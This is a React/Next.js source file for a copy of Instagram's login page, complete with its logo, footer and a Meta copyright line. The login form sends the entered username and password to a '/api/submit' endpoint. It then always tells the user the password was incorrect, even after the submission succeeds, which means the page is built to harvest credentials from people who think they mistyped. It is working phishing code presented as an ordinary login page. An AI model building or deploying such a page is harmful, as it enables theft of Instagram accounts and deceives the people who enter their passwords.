'use client';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { zodResolver } from '@hookform/resolvers/zod';
import Image from 'next/image';
import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { toast } from 'sonner';
import { z } from 'zod';

// Form validation schema
const loginSchema = z.object({
  username: z
    .string()
    .min(1, 'Username is required')
    .min(3, 'Username must be at least 3 characters'),
  password: z
    .string()
    .min(1, 'Password is required')
    .min(6, 'Password must be at least 6 characters'),
});

type LoginFormData = z.infer<typeof loginSchema>;

export default function InstagramLogin() {
  return (
    <div className="min-h-screen bg-white">
      {/* Desktop Layout */}
      <div className="hidden md:flex items-center justify-center min-h-screen px-8">
        <div className="flex items-center max-w-4xl w-full">
          {/* Left side - Photo collage */}
          <div className="flex-1 mr-8">
            <div className="relative w-full max-w-md mx-auto">
              <Image
                src="/landing-2x.png"
                alt="Instagram photos collage"
                width={454}
                height={618}
                className="w-full h-auto"
                priority
              />
            </div>
          </div>

          {/* Right side - Login form */}
          <div className="w-80">
            <LoginForm />
          </div>
        </div>
      </div>

      {/* Mobile Layout */}
      <div className="md:hidden">
        <div className="px-6 pt-32">
          <LoginForm />
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}

function LoginForm() {
  const [isLoading, setIsLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: '',
      password: '',
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsLoading(true);
    setLoginError(null);

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'login',
          ...data,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || 'Login failed');
      }

      setLoginError('Sorry, your password was incorrect. Please double-check your password.');
      // toast.success('Login successful!');
      // Handle successful login (redirect, store token, etc.)
      // Login successful - handle navigation or state updates here
    } catch (error) {
      console.error('Login error:', error);
      toast.error(error instanceof Error ? error.message : 'Something went wrong');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-sm mx-auto">
      {/* Instagram Logo */}
      <div className="text-center mb-8">
        <Image
          src="/insta-text.png"
          alt="Instagram Logo"
          width={200}
          height={200}
          className="mx-auto"
        />
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-3">
          {/* Username/Email Field */}
          <FormField
            control={form.control}
            name="username"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input
                    {...field}
                    type="text"
                    placeholder="Phone number, username, or email"
                    className="w-full h-10 px-3 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white text-black"
                    disabled={isLoading}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          {/* Password Field */}
          <FormField
            control={form.control}
            name="password"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input
                    {...field}
                    type="password"
                    placeholder="Password"
                    className="w-full h-10 px-3 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white text-black"
                    disabled={isLoading}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          {/* Submit Button */}
          <Button
            type="submit"
            className="w-full h-8 bg-blue-500 hover:bg-blue-600 text-white text-sm font-semibold rounded-sm"
            disabled={isLoading}
          >
            {isLoading ? 'Logging in...' : 'Log in'}
          </Button>
        </form>
      </Form>

      {/* OR Divider */}
      <div className="flex items-center my-4">
        <div className="flex-1 border-t border-gray-300"></div>
        <span className="px-4 text-sm text-gray-500 font-semibold">OR</span>
        <div className="flex-1 border-t border-gray-300"></div>
      </div>

      {/* Facebook Login */}
      <div className="text-center mb-4">
        <button
          type="button"
          className="flex items-center justify-center w-full text-blue-600 text-sm font-semibold"
          disabled={isLoading}
        >
          <svg className="w-4 h-4 mr-2" viewBox="0 0 24 24" fill="currentColor">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
          Log in with Facebook
        </button>
      </div>
      {loginError && <p className="text-center text-sm text-red-600 mb-4">{loginError}</p>}

      {/* Forgot Password */}
      <div className="text-center mb-6">
        <button
          type="button"
          className="text-xs text-blue-900 underline bg-transparent border-none cursor-pointer"
        >
          Forgot password?
        </button>
      </div>

      {/* Sign Up */}
      <div className="text-center text-sm">
        <span className="text-gray-500">Don't have an account? </span>
        <button
          type="button"
          className="text-blue-600 font-semibold underline bg-transparent border-none cursor-pointer"
        >
          Sign up
        </button>
      </div>
    </div>
  );
}

function Footer() {
  const footerLinks = [
    'Meta',
    'About',
    'Blog',
    'Jobs',
    'Help',
    'API',
    'Privacy',
    'Terms',
    'Locations',
    'Instagram Lite',
    'Meta AI',
    'Meta AI Articles',
    'Threads',
    'Contact Uploading & Non-Users',
    'Meta Verified',
  ];

  return (
    <footer className="mt-12 pb-8 px-6">
      <div className="max-w-4xl mx-auto">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
          {footerLinks.map(link => (
            <button
              key={link}
              type="button"
              className="text-xs text-gray-500 hover:underline bg-transparent border-none cursor-pointer"
            >
              {link}
            </button>
          ))}
        </div>

        <div className="flex justify-center items-center gap-4 text-xs text-gray-500">
          <select className="bg-transparent text-gray-500 text-xs">
            <option>English</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </div>
    </footer>
  );
}
